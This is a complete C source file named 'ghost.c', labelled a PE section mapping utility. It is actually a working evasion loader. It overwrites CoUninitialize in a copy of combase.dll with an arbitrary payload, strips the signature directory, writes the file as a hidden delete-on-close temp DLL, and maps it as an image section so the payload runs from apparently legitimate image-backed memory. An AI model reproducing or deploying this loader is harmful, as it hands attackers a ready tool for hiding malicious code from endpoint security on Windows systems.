/*
 * ghost.c — PE section mapping utility
 *
 * Same-process implementation. Reads combase.dll from System32 into a
 * temporary buffer, walks the export directory to find CoUninitialize's
 * RVA, translates that RVA to its on-disk file offset via the section
 * table, memcpys the payload over the file bytes at that offset, zeros
 * DataDirectory[4] (security dir) so the file looks unsigned rather than
 * has-invalid-signature, writes the modified bytes to a per-run
 * %TEMP%\<random>.dll opened with FILE_FLAG_DELETE_ON_CLOSE, then calls
 * NtCreateSection(SEC_IMAGE) + NtMapViewOfSection into the current
 * process. The section keeps its own ref to the file bytes so closing
 * the file handle is safe; the mapping stays live until process exit.
 *
 * Returns mapped_base + CoUninitialize_RVA on success, NULL on any error.
 */

#include <windows.h>
#include <bcrypt.h>
#include <string.h>
#include "ghost.h"

/* ── Minimal ntdll typedefs ─────────────────────────────────────────────── */

typedef enum _SECTION_INHERIT_ { ViewShare = 1, ViewUnmap = 2 } SECTION_INHERIT_;

typedef LONG (WINAPI *pfnNtCreateSection)(
    HANDLE *SectionHandle, ACCESS_MASK DesiredAccess,
    void *ObjectAttributes, LARGE_INTEGER *MaximumSize,
    ULONG SectionPageProtection, ULONG AllocationAttributes,
    HANDLE FileHandle);

typedef LONG (WINAPI *pfnNtMapViewOfSection)(
    HANDLE SectionHandle, HANDLE ProcessHandle,
    PVOID *BaseAddress, ULONG_PTR ZeroBits, SIZE_T CommitSize,
    LARGE_INTEGER *SectionOffset, SIZE_T *ViewSize,
    SECTION_INHERIT_ InheritDisposition, ULONG AllocationType,
    ULONG Win32Protect);

typedef LONG (WINAPI *pfnNtClose)(HANDLE Handle);

#ifndef SEC_IMAGE
#define SEC_IMAGE 0x01000000
#endif
#define STATUS_SUCCESS 0

/* ── PE helpers (operate on a raw file buffer, not a mapped image) ──────── */

static DWORD rva_to_offset(const BYTE *pe, DWORD pe_size, DWORD rva)
{
    if (pe_size < 0x400) return 0;
    DWORD e_lfanew = *(DWORD *)(pe + 0x3C);
    if (e_lfanew + 0x108 > pe_size) return 0;
    const BYTE *nt = pe + e_lfanew;
    WORD num_secs = *(WORD *)(nt + 0x06);
    DWORD opt_size = *(WORD *)(nt + 0x14);
    const BYTE *sec = nt + 0x18 + opt_size;

    for (WORD i = 0; i < num_secs; i++) {
        DWORD va  = *(DWORD *)(sec + i*0x28 + 0x0C);
        DWORD vs  = *(DWORD *)(sec + i*0x28 + 0x08);
        DWORD raw = *(DWORD *)(sec + i*0x28 + 0x14);
        DWORD rs  = *(DWORD *)(sec + i*0x28 + 0x10);
        DWORD span = vs > rs ? vs : rs;
        if (rva >= va && rva < va + span) return rva - va + raw;
    }
    return 0;
}

/* Locate an export by name and return its RVA (0 if not found or is a
 * string-forwarder). */
static DWORD resolve_export_rva(const BYTE *pe, DWORD pe_size, const char *name)
{
    if (pe_size < 0x400) return 0;
    if (*(WORD *)pe != 0x5A4D) return 0;                    /* MZ */
    DWORD e_lfanew = *(DWORD *)(pe + 0x3C);
    if (e_lfanew + 0x108 > pe_size) return 0;
    const BYTE *nt = pe + e_lfanew;
    if (*(DWORD *)nt != 0x00004550) return 0;               /* PE00 */

    /* 64-bit optional header: DataDirectory[0] (Export) at nt+0x88 */
    DWORD exp_rva  = *(DWORD *)(nt + 0x88);
    DWORD exp_size = *(DWORD *)(nt + 0x8C);
    if (!exp_rva || !exp_size) return 0;

    DWORD exp_off = rva_to_offset(pe, pe_size, exp_rva);
    if (!exp_off || exp_off + 0x28 > pe_size) return 0;
    const BYTE *ed = pe + exp_off;

    DWORD nnames  = *(DWORD *)(ed + 0x18);
    DWORD aof_rva = *(DWORD *)(ed + 0x1C);
    DWORD aon_rva = *(DWORD *)(ed + 0x20);
    DWORD ano_rva = *(DWORD *)(ed + 0x24);

    DWORD aof_off = rva_to_offset(pe, pe_size, aof_rva);
    DWORD aon_off = rva_to_offset(pe, pe_size, aon_rva);
    DWORD ano_off = rva_to_offset(pe, pe_size, ano_rva);
    if (!aof_off || !aon_off || !ano_off) return 0;

    SIZE_T name_len = strlen(name);
    for (DWORD i = 0; i < nnames; i++) {
        DWORD n_rva = *(DWORD *)(pe + aon_off + i*4);
        DWORD n_off = rva_to_offset(pe, pe_size, n_rva);
        if (!n_off || n_off + name_len >= pe_size) continue;
        if (memcmp(pe + n_off, name, name_len + 1) == 0) {
            WORD  ord = *(WORD  *)(pe + ano_off + i*2);
            DWORD frv = *(DWORD *)(pe + aof_off + ord*4);
            /* Forwarders point back into the export dir — skip */
            if (frv >= exp_rva && frv < exp_rva + exp_size) return 0;
            return frv;
        }
    }
    return 0;
}

/* 4 random hex chars → "xxxxxxxx.dll" (16 wchars incl. NUL) */
static void random_basename(wchar_t *out)
{
    static const wchar_t hex[] = L"0123456789abcdef";
    BYTE r[4];
    BCryptGenRandom(NULL, r, sizeof(r), BCRYPT_USE_SYSTEM_PREFERRED_RNG);
    int j = 0;
    for (int i = 0; i < 4; i++) {
        out[j++] = hex[(r[i] >> 4) & 0xF];
        out[j++] = hex[ r[i]       & 0xF];
    }
    out[j] = 0;
    wcscat(out, L".dll");
}

/* ── Entry point ───────────────────────────────────────────────────────── */

void *ghost_map(const void *payload, SIZE_T payload_len)
{
    void  *result       = NULL;
    BYTE  *pe_buf       = NULL;
    HANDLE hFile        = INVALID_HANDLE_VALUE;
    HANDLE hSection     = NULL;
    void  *base         = NULL;
    DWORD  pe_size      = 0;
    pfnNtClose pNtClose = NULL;

    /* 1. Read combase.dll from System32 */
    wchar_t src_path[MAX_PATH];
    if (!GetSystemDirectoryW(src_path, MAX_PATH)) goto cleanup;
    if (wcslen(src_path) + wcslen(L"\\combase.dll") + 1 > MAX_PATH) goto cleanup;
    wcscat(src_path, L"\\combase.dll");

    HANDLE hSrc = CreateFileW(src_path, GENERIC_READ, FILE_SHARE_READ,
                              NULL, OPEN_EXISTING, 0, NULL);
    if (hSrc == INVALID_HANDLE_VALUE) goto cleanup;
    pe_size = GetFileSize(hSrc, NULL);
    if (!pe_size || pe_size == INVALID_FILE_SIZE) { CloseHandle(hSrc); goto cleanup; }
    pe_buf = (BYTE *)VirtualAlloc(NULL, pe_size, MEM_COMMIT | MEM_RESERVE,
                                   PAGE_READWRITE);
    if (!pe_buf) { CloseHandle(hSrc); goto cleanup; }
    DWORD read = 0;
    BOOL rok = ReadFile(hSrc, pe_buf, pe_size, &read, NULL) && read == pe_size;
    CloseHandle(hSrc);
    if (!rok) goto cleanup;

    /* 2. Resolve CoUninitialize's RVA and file offset */
    DWORD func_rva = resolve_export_rva(pe_buf, pe_size, "CoUninitialize");
    if (!func_rva) goto cleanup;
    DWORD file_off = rva_to_offset(pe_buf, pe_size, func_rva);
    if (!file_off || file_off + payload_len > pe_size) goto cleanup;

    /* 3. Patch payload into the file bytes */
    memcpy(pe_buf + file_off, payload, payload_len);

    /* 4. Zero DataDirectory[4] (security) so file looks unsigned rather
     * than has-invalid-signature. 64-bit OptionalHeader starts at nt+0x18;
     * DataDirectory at OptHdr+0x70 = nt+0x88; entry 4 at nt+0x88+4*8=nt+0xA8. */
    DWORD e_lfanew = *(DWORD *)(pe_buf + 0x3C);
    BYTE *nt = pe_buf + e_lfanew;
    *(DWORD *)(nt + 0xA8) = 0;   /* VirtualAddress */
    *(DWORD *)(nt + 0xAC) = 0;   /* Size */

    /* 5. Write to %TEMP%\<random>.dll with delete-on-close */
    wchar_t temp_dir[MAX_PATH];
    if (!GetTempPathW(MAX_PATH, temp_dir)) goto cleanup;
    wchar_t basename[16];
    random_basename(basename);
    wchar_t out_path[MAX_PATH];
    if (wcslen(temp_dir) + wcslen(basename) + 1 > MAX_PATH) goto cleanup;
    wcscpy(out_path, temp_dir);
    wcscat(out_path, basename);

    hFile = CreateFileW(out_path,
                         GENERIC_READ | GENERIC_WRITE | DELETE,
                         FILE_SHARE_READ | FILE_SHARE_DELETE,
                         NULL, CREATE_ALWAYS,
                         FILE_ATTRIBUTE_TEMPORARY | FILE_FLAG_DELETE_ON_CLOSE,
                         NULL);
    if (hFile == INVALID_HANDLE_VALUE) goto cleanup;

    DWORD written = 0;
    if (!WriteFile(hFile, pe_buf, pe_size, &written, NULL) || written != pe_size)
        goto cleanup;
    FlushFileBuffers(hFile);

    /* 6. NtCreateSection SEC_IMAGE + NtMapViewOfSection */
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) goto cleanup;
    pfnNtCreateSection    pNtCreateSection    = (pfnNtCreateSection)   GetProcAddress(ntdll, "NtCreateSection");
    pfnNtMapViewOfSection pNtMapViewOfSection = (pfnNtMapViewOfSection)GetProcAddress(ntdll, "NtMapViewOfSection");
                          pNtClose            = (pfnNtClose)           GetProcAddress(ntdll, "NtClose");
    if (!pNtCreateSection || !pNtMapViewOfSection || !pNtClose) goto cleanup;

    LONG status = pNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, NULL,
                                    PAGE_READONLY, SEC_IMAGE, hFile);
    if (status != STATUS_SUCCESS || !hSection) { hSection = NULL; goto cleanup; }

    SIZE_T view_size = 0;
    status = pNtMapViewOfSection(hSection, GetCurrentProcess(), &base, 0, 0, NULL,
                                  &view_size, ViewShare, 0, PAGE_READONLY);
    if (status != STATUS_SUCCESS || !base) goto cleanup;

    /* Success — mapped_base + func_rva is where the payload now lives
     * inside a MEM_IMAGE region. Keep the mapping and section handle
     * alive (do not close hSection); return the derived address. */
    result = (BYTE *)base + func_rva;
    hSection = NULL;  /* prevent cleanup path from closing it */

cleanup:
    if (pe_buf) VirtualFree(pe_buf, 0, MEM_RELEASE);
    if (hFile != INVALID_HANDLE_VALUE) CloseHandle(hFile);
    if (hSection && pNtClose) pNtClose(hSection);
    return result;
}
